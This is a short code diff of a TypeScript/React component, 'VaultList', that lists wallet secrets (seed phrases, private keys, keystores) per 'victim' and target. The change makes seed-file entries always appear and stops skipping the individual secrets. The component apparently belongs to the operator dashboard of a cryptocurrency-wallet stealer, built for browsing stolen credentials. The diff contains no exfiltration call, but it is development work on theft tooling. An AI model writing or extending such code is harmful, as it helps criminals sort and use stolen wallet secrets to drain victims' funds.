@@ -45,13 +45,12 @@ export function VaultList({ victimId, onAction, disabled }: { victimId: string; 
       for (const wallet of group.wallets) {
         if (state && wallet.state !== state) continue;
         const secrets = wallet.secrets.filter((secret) => mode === 'seed' ? secret.kind === 'seed' : ['private_key', 'keystore'].includes(secret.kind));
-        if (mode === 'seed' && secrets.length === 0 && wallet.path && group.seedFile) {
+        if (mode === 'seed' && group.seedFile) {
           out.push({
             key: `${wallet.id}:file`, walletId: wallet.id, kind: 'seed_file', preview: 'fichero de semillas',
             words: null, path: wallet.path, source: wallet.source ?? null, state: wallet.state,
             targetId: group.targetId, updatedAt: wallet.lastSeenAt ?? '', seedFile: true
           });
-          continue;
         }
         for (const secret of secrets) {
           out.push({
